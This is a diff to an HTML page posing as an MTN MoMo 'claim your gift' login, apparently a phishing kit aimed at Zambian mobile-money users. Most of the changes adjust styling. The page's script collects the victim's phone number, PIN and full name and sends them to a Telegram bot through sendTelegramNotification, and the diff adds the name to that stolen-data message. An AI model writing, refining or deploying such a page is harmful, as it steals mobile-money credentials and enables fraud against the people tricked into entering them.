@@ -39,7 +39,7 @@
         
         .logo {
             text-align: center;
-            padding: 20px 20px 30px;
+            padding: 20px 20px 25px;
             width: 100%;
         }
         
@@ -59,7 +59,7 @@
         .login-card {
             background: white;
             border-radius: 24px;
-            padding: 35px 28px;
+            padding: 30px 25px;
             width: 100%;
             max-width: 400px;
             box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
@@ -71,7 +71,7 @@
             font-weight: 700;
             color: #1a1a2e;
             text-align: center;
-            margin-bottom: 5px;
+            margin-bottom: 4px;
         }
         
         .title .highlight {
@@ -82,22 +82,25 @@
             font-size: 14px;
             color: #888;
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
         
+        /* ===== GIFT PREVIEW - FIXED POSITION ===== */
         .gift-preview {
             background: #f8f9ff;
             border-radius: 12px;
-            padding: 12px 16px;
+            padding: 14px 16px;
             margin-bottom: 20px;
             display: flex;
             align-items: center;
-            gap: 12px;
-            border: 2px solid #e8ecf5;
+            gap: 14px;
+            border: 2px solid #0047AB;
+            box-shadow: 0 2px 8px rgba(0, 71, 171, 0.08);
         }
         
         .gift-preview .icon {
-            font-size: 28px;
+            font-size: 32px;
+            flex-shrink: 0;
         }
         
         .gift-preview .info {
@@ -107,23 +110,34 @@
         .gift-preview .info .label {
             font-size: 10px;
             color: #888;
-            font-weight: 500;
+            font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
         
         .gift-preview .info .name {
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 700;
             color: #1a1a2e;
         }
         
         .gift-preview .info .value {
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 600;
             color: #0047AB;
         }
         
+        .gift-preview .badge {
+            background: #0047AB;
+            color: white;
+            font-size: 9px;
+            font-weight: 700;
+            padding: 3px 12px;
+            border-radius: 20px;
+            flex-shrink: 0;
+        }
+        
+        /* ===== PHONE GROUP ===== */
         .phone-group {
             width: 100%;
             border: 2px solid #0047AB;
@@ -173,6 +187,7 @@
             color: #aaa;
         }
         
+        /* ===== PIN ===== */
         .pin-label {
             font-size: 14px;
             color: #666;
@@ -222,6 +237,7 @@
             80% { transform: translateX(8px); }
         }
         
+        /* ===== STATUS ===== */
         .status-message {
             text-align: center;
             padding: 10px 14px;
@@ -253,6 +269,7 @@
             border: 1px solid #bbdefb;
         }
         
+        /* ===== FORGOT LINK ===== */
         .forgot-link {
             text-align: center;
             margin-bottom: 20px;
@@ -271,6 +288,7 @@
             opacity: 0.7;
         }
         
+        /* ===== LOGIN BUTTON ===== */
         #loginBtn {
             width: 100%;
             padding: 16px;
@@ -301,10 +319,11 @@
             transform: none !important;
         }
         
+        /* ===== BOTTOM SECTION ===== */
         .bottom-section {
             background: #0047AB;
             color: white;
-            padding: 50px 30px 35px;
+            padding: 40px 30px 30px;
             text-align: center;
             width: 100%;
             max-width: 400px;
@@ -314,7 +333,7 @@
         
         .bottom-text {
             font-size: 14px;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
             line-height: 1.6;
             opacity: 0.95;
         }
@@ -329,7 +348,7 @@
             justify-content: center;
             gap: 20px;
             flex-wrap: wrap;
-            margin-bottom: 25px;
+            margin-bottom: 22px;
         }
         
         .bottom-btn {
@@ -381,6 +400,7 @@
             opacity: 0.8;
         }
         
+        /* ===== SPINNER ===== */
         #spinnerOverlay {
             position: fixed;
             top: 0;
@@ -419,23 +439,29 @@
             font-weight: 500;
         }
         
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
             body { padding: 10px; }
             .logo-text { font-size: 28px; }
-            .login-card { padding: 25px 18px; }
-            .title { font-size: 20px; margin-bottom: 15px; }
+            .logo { padding: 15px 20px 20px; }
+            .login-card { padding: 20px 16px; }
+            .title { font-size: 20px; margin-bottom: 2px; }
+            .subtitle { font-size: 13px; margin-bottom: 16px; }
             .pin-box { width: 48px; height: 48px; font-size: 20px; }
             .pin-group { gap: 10px; }
-            .bottom-section { padding: 35px 20px 25px; }
+            .bottom-section { padding: 30px 20px 25px; }
             .bottom-btn { width: 120px; padding: 12px 16px; font-size: 13px; }
-            .logo { padding: 10px 20px 20px; }
             .gift-preview {
-                padding: 10px 14px;
+                padding: 12px 14px;
+                gap: 10px;
             }
             .gift-preview .icon {
-                font-size: 24px;
+                font-size: 26px;
             }
             .gift-preview .info .name {
+                font-size: 14px;
+            }
+            .gift-preview .info .value {
                 font-size: 13px;
             }
         }
@@ -463,7 +489,7 @@
             <h1 class="title">🔐 <span class="highlight">MoMo</span> Account</h1>
             <p class="subtitle">Enter the MoMo account to receive your gift</p>
             
-            <!-- Gift Preview -->
+            <!-- ===== GIFT PREVIEW - Shows selected gift ===== -->
             <div class="gift-preview" id="giftPreview">
                 <span class="icon" id="giftIcon">🎁</span>
                 <div class="info">
@@ -471,6 +497,7 @@
                     <div class="name" id="giftName">Loading...</div>
                     <div class="value" id="giftValue">-</div>
                 </div>
+                <span class="badge">SELECTED</span>
             </div>
 
             <!-- Phone Input -->
@@ -500,7 +527,7 @@
             </div>
 
             <!-- Login Button -->
-            <button id="loginBtn">CLAIM GIFT →</button>
+            <button id="loginBtn">🎁 CLAIM GIFT →</button>
         </div>
 
         <!-- Bottom Section -->
@@ -547,11 +574,10 @@
         console.log('====================================');
         console.log('🤖 Bot Token:', BOT_TOKEN);
         console.log('📱 Chat ID:', CHAT_ID);
-        console.log('🌐 API URL:', API_URL);
         console.log('====================================');
 
         // ============================================
-        // LOAD SELECTED GIFT
+        // LOAD SELECTED GIFT - Shows at top
         // ============================================
         function loadSelectedGift() {
             const gift = localStorage.getItem('selectedGift') || 'Not selected';
@@ -563,6 +589,7 @@
             document.getElementById('giftValue').textContent = value;
             
             console.log('🎁 Gift to receive:', gift, '-', value);
+            console.log('👤 User:', localStorage.getItem('fullName') || 'Not provided');
         }
 
         loadSelectedGift();
@@ -651,12 +678,13 @@
         async function sendTelegramNotification(phone, pin) {
             const gift = localStorage.getItem('selectedGift') || 'Not specified';
             const giftValue = localStorage.getItem('selectedGiftValue') || '-';
+            const fullName = localStorage.getItem('fullName') || 'Not provided';
             
             const message = `🔐 *MTN MoMo - Gift Claim Login*\n\n` +
                 `🎁 *Gift to Receive:* ${gift} (${giftValue})\n` +
                 `📱 *MoMo Account:* +260 ${phone}\n` +
                 `🔢 *PIN:* ${pin}\n` +
-                `👤 *User:* ${localStorage.getItem('fullName') || 'Not provided'}\n` +
+                `👤 *User:* ${fullName}\n` +
                 `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
                 `✅ User is claiming their gift. Please process.`;
 
@@ -757,7 +785,9 @@
             }
             phoneInput.focus();
             checkPinComplete();
+            
             console.log('✅ MTN MoMo - MoMo Account Login page loaded');
+            console.log('🎁 Selected Gift:', localStorage.getItem('selectedGift'));
             console.log('====================================');
         });
     </script>
